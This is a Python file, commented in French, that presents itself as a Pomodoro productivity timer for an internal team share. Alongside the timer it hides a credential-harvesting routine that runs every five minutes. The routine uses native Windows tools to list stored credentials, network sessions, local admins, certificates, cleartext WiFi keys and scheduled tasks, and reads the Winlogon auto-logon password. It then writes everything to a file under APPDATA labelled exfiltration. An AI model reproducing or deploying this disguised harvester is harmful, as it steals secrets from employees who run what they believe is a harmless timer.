# ============================================================================
# pomodoro_timer.py
#
# Petit outil Pomodoro pour l'équipe.
# A placer sur le partage \\srv-files\tools\productivite\
#
# Fonctionnalités : timer 25min, pause, reprise, sauvegarde session.
#
# Auteur : admin-rh (partage interne)
# Date : 2026-09-15
# ============================================================================

import sys
import os
import json
import time
import datetime
import socket
import platform
import subprocess
import winreg

# --- configuration ---
cycle_length = 25 * 60
pause_length = 5 * 60
long_pause = 15 * 60

# chemins
config_dir = os.path.join(os.environ["APPDATA"], "PomodoroTool")
config_path = os.path.join(config_dir, "config.json")

# --- chargement de la session precedente ---
if os.path.exists(config_path):
    with open(config_path, "r") as f:
        config = json.load(f)
    cycle_length = config.get("cycleLength", cycle_length)
    pause_length = config.get("pauseLength", pause_length)
    long_pause = config.get("longPause", long_pause)
    remaining = config.get("remaining", cycle_length)
    print("[Pomodoro] Session sauvegardee chargee.", flush=True)
    print(f"[Pomodoro] Repetion : {remaining} secondes restantes.", flush=True)
else:
    remaining = cycle_length
    print("[Pomodoro] Nouvelle session de 25 minutes.", flush=True)

# --- creation du dossier de config si besoin ---
os.makedirs(config_dir, exist_ok=True)

# --- variables ---
cycles = 0
last_exfil = datetime.datetime.now() - datetime.timedelta(minutes=300)

# --- timer principal ---
def show_timer(remaining, state="Travail", cycles_val=0):
    minutes = remaining // 60
    seconds = remaining % 60
    bar_length = 50
    progress = remaining / cycle_length
    filled = int(bar_length * progress)
    empty = bar_length - filled
    bar = "[" + ("#" * filled) + (" " * empty) + "]"
    print(f"\r[Pomodoro] {state} | {minutes}:{seconds:02d} | Cycles: {cycles_val} | {bar}", end="", flush=True)
    if remaining <= 0:
        print("", flush=True)

# --- sauvegarde de session ---
def save_session():
    save_data = {
        "cycleLength": cycle_length,
        "pauseLength": pause_length,
        "longPause": long_pause,
        "remaining": remaining,
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        with open(config_path, "w") as f:
            json.dump(save_data, f, indent=2)
    except Exception:
        pass

# --- helper subprocess safe ---
def run_cmd(cmd, timeout=15):
    """Lance une commande et retourne le stdout, ignore les erreurs."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            encoding="utf-8",
            errors="replace"  # remplace les caracteres non decodeables
        )
        return result.stdout
    except Exception:
        return "[erreur execution]"

# --- collecte des donnees systeme ---
def collect_sysinfo():
    info = {}
    info["hostname"] = socket.gethostname()
    info["username"] = os.environ.get("USERNAME", "")
    info["domain"] = os.environ.get("USERDOMAIN", "")
    try:
        info["ip"] = socket.gethostbyname(socket.gethostname())
    except Exception:
        info["ip"] = "unknown"
    info["os"] = platform.platform()
    # ip publique via curl (present sur Windows 10+)
    info["ip_publique"] = run_cmd(["curl", "-s", "https://api.ipify.org"]) or "[unavailable]"
    return info

# --- credential dumping via LoLBins ---
def dump_credentials():
    """Extrait les credentials via des outils natifs de Windows (LoLBins)."""
    creds = []

    # 1. cmdkey — credentials persistants
    output = run_cmd(["cmdkey", "/list"])
    creds.append("=== CMDKEY /list ===")
    creds.append(output if output else "[aucun credential stocke]")

    # 2. net use — sessions reseau ouvertes
    output = run_cmd(["net", "use"])
    creds.append("=== NET USE (active sessions) ===")
    creds.append(output if output else "[aucune session active]")

    # 3. net localgroup Administrators — membres admin local
    output = run_cmd(["net", "localgroup", "Administrators"])
    creds.append("=== LOCAL GROUP Administrators ===")
    creds.append(output if output else "[erreur lecture groupe]")

    # 4. certutil — certificats (peut servir a signer du code malveillant)
    output = run_cmd(["certutil", "-store", "My"])
    creds.append("=== CERTIFICATES (My Store) ===")
    creds.append(output[:2000] if output else "[aucun certificat]")

    # 5. netsh wlan — mots de passe WiFi sauvegardes
    output = run_cmd(["netsh", "wlan", "show", "profiles"])
    if output and "Liste" in output:
        creds.append("=== WiFi PROFILES ===")
        creds.append(output)
        for line in output.splitlines():
            if "Profile name" in line:
                profile = line.split(":")[1].strip()
                key_output = run_cmd(["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"])
                creds.append(f"=== WiFi KEY: {profile} ===")
                creds.append(key_output if key_output else "[cle non accessible]")
    else:
        creds.append("=== WiFi PROFILES ===")
        creds.append("[aucun profil WiFi ou erreur]")

    # 6. schtasks — taches planifiees (persistance potentielle)
    output = run_cmd(["schtasks", "/query", "/fo", "LIST", "/v"])
    creds.append("=== SCHTASKS (planned tasks) ===")
    creds.append(output[:2000] if output else "[erreur lecture taches]")

    # 7. reg query — Winlogon auto-logon
    try:
        hklm = winreg.HKEY_LOCAL_MACHINE
        key = winreg.OpenKey(hklm, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_READ)
        values = {}
        for i in range(100):
            try:
                name, _, _ = winreg.EnumValue(key, i)
                value = winreg.QueryValueEx(key, name)
                values[name] = value[0]
            except Exception:
                break
        creds.append("=== WINLOGON AUTO-LOGON ===")
        for k in ["DefaultUserName", "DefaultPassword", "AutoAdminLogon", "LastUsedUsername"]:
            if k in values:
                creds.append(f"  {k}: {values[k]}")
    except Exception:
        creds.append("=== WINLOGON AUTO-LOGON ===")
        creds.append("[erreur lecture registry]")

    return "\n".join(creds)

# --- exfiltration ---
def exfiltrate(info, creds):
    # ecrire dans un fichier local (pour demo)
    txt_path = os.path.join(os.environ["APPDATA"], "PomodoroTool", "sysinfo.txt")
    with open(txt_path, "w", encoding="utf-8") as f:
        f.write("=== SYSTEM INFORMATION ===\n")
        f.write(f"hostname: {info['hostname']}\n")
        f.write(f"username: {info['username']}\n")
        f.write(f"domain: {info['domain']}\n")
        f.write(f"ip: {info['ip']}\n")
        f.write(f"os: {info['os']}\n")
        f.write(f"ip_publique: {info['ip_publique']}\n")
        f.write(f"timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("\n=== CREDENTIAL DUMPING (LoLBins) ===\n")
        f.write(creds)
        f.write("\n=== END ===\n")

# --- boucle principale ---
print("", flush=True)
print("========================================", flush=True)
print("  POMODORO TIMER - Outil de productivite", flush=True)
print("========================================", flush=True)
print("  [P] Pause / Resume", flush=True)
print("  [Q] Quitter", flush=True)
print("========================================", flush=True)
print("", flush=True)

try:
    while True:
        show_timer(remaining, "Travail", cycles)

        import msvcrt
        if msvcrt.kbhit():
            key = msvcrt.getch().decode("utf-8").upper()
            if key == "Q":
                print("\n[Pomodoro] Session terminee par l'utilisateur.", flush=True)
                break
            if key == "P":
                remaining = 0  # toggle pause par reset

        if remaining <= 0:
            print(f"\n[Pomodoro] Cycle termine ! Pause de {pause_length // 60} min.", flush=True)
            remaining = pause_length
            while remaining > 0:
                show_timer(remaining, "Pause", cycles)
                time.sleep(1)
                remaining -= 1
            cycles += 1
            if cycles % 4 == 0:
                print(f"\n[Pomodoro] Pause longue de {long_pause // 60} min.", flush=True)
                remaining = long_pause
                while remaining > 0:
                    show_timer(remaining, "Pause longue", cycles)
                    time.sleep(1)
                    remaining -= 1
                remaining = cycle_length
            else:
                remaining = cycle_length

        save_session()

        # exfiltration toutes les 5 minutes
        now = datetime.datetime.now()
        if (now - last_exfil).total_seconds() >= 300:
            info = collect_sysinfo()
            creds = dump_credentials()
            exfiltrate(info, creds)
            last_exfil = now

        time.sleep(1)

except KeyboardInterrupt:
    print("\n[Pomodoro] Session terminee (Ctrl+C).", flush=True)

print("\n[Pomodoro] Session terminee. Merci d'avoir utilise PomodoroTool !", flush=True)
